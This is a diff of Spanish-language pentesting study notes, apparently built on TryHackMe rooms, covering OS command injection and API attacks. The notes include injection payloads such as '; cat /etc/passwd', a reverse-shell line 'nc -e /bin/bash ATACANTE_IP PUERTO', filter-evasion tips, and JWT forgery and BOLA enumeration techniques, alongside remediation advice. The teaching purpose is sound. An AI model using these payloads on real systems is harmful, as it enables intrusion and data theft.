@@ -9,6 +9,8 @@
 
 ---
 
+<br>
+
 <h2>
   <img src="https://cdn-images.tryhackme.com/room-icons/6093e17fa004d20049b6933e-1722528947776" width="60px" align="absmiddle">
   <span> Gestión de Sesiones (Session Management)</span>
@@ -206,16 +208,16 @@ Para auditar vulnerabilidades de inclusión de archivos en una aplicación web s
 <br>
 
 <h2>
-  <img src="https://cdn-images.tryhackme.com/room-icons/5e2656cb5a909ddf63395dd7e7a377ad.png" width="60px" align="absmiddle">
-  <span> Inclusión de Archivos (File Inclusion - LFI / RFI)</span>
+  <img src="https://cdn-images.tryhackme.com/room-icons/a72f3f1c0445bac396659c36a1e8c355.png" width="60px" align="absmiddle">
+  <span> Inyección de Comandos (Command Injection)</span>
 </h2>
-
-## 4. Inyección de Comandos (Command Injection)
 
 ### 4.1 Introducción y Diferenciación Técnica
 La inyección de comandos en el sistema operativo (OS Command Injection) ocurre cuando una aplicación web toma datos proporcionados por el usuario y los concatena directamente dentro de una llamada del sistema que ejecuta comandos de la consola del servidor backend, sin el debido saneamiento ni parametrización. Esta vulnerabilidad se clasifica en el OWASP Top 10 bajo A05: Inyección y corresponde a la categoría CWE-78.
 
 Es crucial diferenciar la Inyección de Comandos de la Ejecución Remota de Código (RCE). RCE es el impacto o resultado final donde un atacante logra ejecutar código arbitrario en un entorno remoto. La Inyección de Comandos es una técnica específica para lograr RCE mediante la manipulación del interprete de comandos del sistema operativo (`sh`, `bash`, `cmd.exe`, `powershell.exe`). Los comandos inyectados se ejecutan con los mismos privilegios del proceso que aloja la aplicación web (por ejemplo, el usuario `www-data` o `apache`).
+
+<br>
 
 ### 4.2 Descubrimiento de Código Vulnerable
 La vulnerabilidad surge cuando los lenguajes de programación utilizan funciones integradas para invocar la consola del sistema operativo pasando cadenas no desinfectadas.
@@ -239,6 +241,8 @@ A continuación se analiza un ejemplo explicativo en código PHP vulnerable que 
 
 Si el usuario envía un título legítimo como `Yesterday`, el sistema ejecuta `grep Yesterday /var/www/html/songtitle.txt`. Sin embargo, si el usuario envía `; cat /etc/passwd`, el comando construido se transforma en `grep ; cat /etc/passwd /var/www/html/songtitle.txt`. La consola interpreta el punto y coma `;` como un separador e invoca el comando `cat`, devolviendo el archivo de contraseñas del sistema.
 
+<br>
+
 ### 4.3 Explotación de Inyección de Comandos
 La explotación se basa en utilizar operadores del interprete de comandos (*shell operators*) para encadenar instrucciones adicionales. El punto y coma `;` en Linux ejecuta el segundo comando secuencialmente sin importar si el primero tuvo éxito. El operador `&&` ejecuta el segundo comando únicamente si el primero finalizó con éxito. El operador `||` ejecuta el segundo comando únicamente si el primero falló. El ampersand `&` ejecuta el primer comando en segundo plano e inicia inmediatamente el segundo. La tubería `|` redirige la salida del primer comando como entrada del segundo.
 
@@ -254,12 +258,16 @@ Otra técnica para la inyección ciega consiste en redirigir la salida hacia un 
 curl -i -s "http://target.com/search.php?title=%3B%20whoami"
 ```
 
+<br>
+
 ### 4.4 Payloads Útiles por Sistema Operativo
 Dependiendo del sistema operativo del servidor objetivo, se emplean distintos comandos para el reconocimiento y la exfiltración.
 
 En sistemas Linux, el comando `whoami` identifica el usuario ejecutor, `id` muestra el UID y grupos de seguridad, `uname -a` revela detalles del kernel, `ls -la` lista todos los archivos del directorio actual incluyendo ocultos, `cat /etc/passwd` expone la lista de cuentas del sistema, `ping -c 5 127.0.0.1` o `sleep 5` pausan la respuesta para confirmar inyección ciega, y `nc -e /bin/bash ATACANTE_IP PUERTO` inicia una conexión de shell inverso hacia la máquina del auditor.
 
 En sistemas Windows, el comando `whoami` identifica el usuario y dominio, `whoami /priv` expone los privilegios asignados al token del usuario actual para detectar vectores de escalada, `dir` lista los archivos y directorios del entorno actual, `ipconfig /all` muestra las interfaces y configuración IP, y `ping -n 5 127.0.0.1` o `timeout /t 5` pausan la respuesta para confirmar inyección ciega.
+
+<br>
 
 ### 4.5 Remedación y Evasión de Filtros
 La remediación definitiva consiste en evitar la ejecución de comandos del sistema operativo a través del shell. En su lugar, se deben utilizar funciones o APIs nativas del lenguaje de programación. Si el uso de comandos del sistema es estrictamente inevitable, la entrada del usuario nunca debe concatenarse en la cadena de comandos. Se deben utilizar funciones que acepten un arreglo de argumentos independientes (como `subprocess.run(["grep", title, "file.txt"], shell=False)` en Python), donde el intérprete trata cada elemento estrictamente como un dato y no como código ejecutable.
@@ -279,7 +287,16 @@ Asimismo, se deben aplicar validaciones estrictas en el servidor mediante listas
 
 Cuando los desarrolladores intentan sanear las entradas mediante listas negras que eliminan palabras clave o caracteres especiales (como espacios o barras), los atacantes evitan las restricciones utilizando codificaciones alternativas. Por ejemplo, si el servidor bloquea la cadena `/etc/passwd`, el atacante puede enviar la representación hexadecimal equivalente de la ruta, logrando que el filtro la deje pasar pero que el interprete subyacente la ejecute correctamente tras la decodificación.
 
+<br>
+
 ---
+
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1779263884488" width="60px" align="absmiddle">
+  <span> Pentesting de APIs (API Pentesting)</span>
+</h2>
 
 ## 5. Pentesting de APIs (API Pentesting)
 
@@ -287,6 +304,8 @@ Cuando los desarrolladores intentan sanear las entradas mediante listas negras q
 Una Interfaz de Programación de Aplicaciones (API) es una estructura de comunicación que permite la interacción de datos entre diferentes componentes de software. En las arquitecturas modernas, las APIs constituyen la columna vertebral del backend, sirviendo simultáneamente a aplicaciones web, aplicaciones móviles e integraciones de terceros. A diferencia de las aplicaciones web tradicionales que devuelven páginas HTML completas formateadas para humanos, las APIs intercambian datos ligeros en formato JSON o XML.
 
 Desde la perspectiva de las pruebas de seguridad, las APIs presentan una superficie de ataque única. No existe una interfaz de usuario gráfica (GUI) que limite la interacción; no hay botones ni formularios visuales. El auditor interactúa directamente con los puntos finales (*endpoints*) sin procesar mediante herramientas como Burp Suite, Postman o Insomnia. Esta interacción directa permite enviar cualquier estructura de datos manipulada, abriendo vulnerabilidades específicas como la Autorización de Nivel de Objeto Rota (BOLA) y la Asignación Masiva (Mass Assignment).
+
+<br>
 
 ### 5.2 Funcionamiento de las APIs RESTful
 El estilo arquitectónico más extendido es REST (Representational State Transfer). Las APIs RESTful organizan la información en torno al concepto de recursos (como usuarios, productos o pedidos). Cada recurso se identifica mediante una URL única y predecible denominada punto final o *endpoint* (por ejemplo, `/v1/users` o `/v1/orders/1045`).
@@ -297,6 +316,8 @@ Cada respuesta de la API incluye un código de estado HTTP que indica el resulta
 
 Para la autenticación, las APIs utilizan tres esquemas principales: Claves de API (claves estáticas enviadas en encabezados como `X-API-Key`), Tokens Bearer (tokens de sesión temporales) y JSON Web Tokens (JWT). Un JWT consta de tres partes codificadas en Base64 separadas por puntos: el encabezado (algoritmo utilizado), la carga útil o *payload* (reclamaciones como `user_id`, `role` y `exp`), y la firma criptográfica. Es crucial recordar que la carga útil de un JWT no está cifrada, solo codificada, por lo que cualquier persona en posesión del token puede decodificarla y leer su contenido.
 
+<br>
+
 ### 5.3 Autorización de Nivel de Objeto Rota (BOLA / IDOR en APIs)
 La Autorización de Nivel de Objeto Rota (BOLA - Broken Object Level Authorization) ocupa la primera posición en el OWASP API Security Top 10. Es el equivalente a las Referencias Directas Inseguras a Objetos (IDOR) en aplicaciones web tradicionales.
 
@@ -306,12 +327,16 @@ Dado que las APIs RESTful utilizan URLs altamente predecibles (como `GET /v1/use
 
 Cuando los identificadores son números enteros secuenciales, el ataque se escala de forma automatizada mediante un bucle simple (del 1 al 1000) en Burp Intruder o un script de Python, permitiendo la exfiltración masiva de toda la base de datos de la aplicación en pocos segundos. Si la API utiliza UUIDs impredecibles en lugar de enteros, esto añade oscuridad pero no seguridad; los UUIDs pueden ser descubiertos explorando otros puntos finales de la API o mediante mensajes de error.
 
+<br>
+
 ### 5.4 Autenticación Rota y Exposición Excesiva de Datos en APIs
 La autenticación rota en APIs se manifiesta frecuentemente por la falta de limitación de tasa (*rate limiting*) en los puntos finales de inicio de sesión o verificación de códigos OTP. Dado que las APIs están diseñadas para acceso programático, los desarrolladores suelen omitir protecciones como CAPTCHA o bloqueos de cuenta. Esto permite enviar miles de intentos de combinación de credenciales por minuto, facilitando ataques de fuerza bruta y *credential stuffing*.
 
 Asimismo, los defectos en la implementación de JWT representan un vector crítico. Si el secreto de firma utilizado en algoritmos HS256 es débil o predecible (como palabras de diccionario), un auditor puede descifrar la clave sin conexión mediante `hashcat` o `jwt_tool` y forjar tokens con privilegios administrativos. Otro fallo relevante es el ataque de algoritmo `none`, donde el auditor modifica el encabezado a `"alg": "none"`, elimina la firma del token y la API acepta el token manipulado sin validar la firma.
 
 La Exposición Excesiva de Datos (Excessive Data Exposure) se produce cuando la API devuelve objetos JSON completos leídos de la base de datos, confiando erróneamente en que la aplicación de cliente (web o móvil) se encargará de filtrar los campos sensibles antes de mostrarlos en pantalla. Si la respuesta JSON de un perfil público incluye campos privados como `password_hash`, `api_key`, `credit_balance` o `role`, cualquier usuario que inspeccione la respuesta HTTP sin procesar en Burp Suite accederá a dicha información sensible. Al combinar la Exposición Excesiva de Datos con una vulnerabilidad BOLA, la falla se escala de un problema de control de acceso a una fuga masiva de datos críticos.
+
+<br>
 
 ### 5.5 Asignación Masiva (Mass Assignment) y Limitación de Tasa
 La Asignación Masiva (Mass Assignment) ocurre cuando la API toma los datos JSON enviados por el cliente en una petición de actualización (POST, PUT o PATCH) y los enlaza directamente a los modelos de objetos internos del servidor, sin filtrar qué campos está autorizado a modificar el cliente.
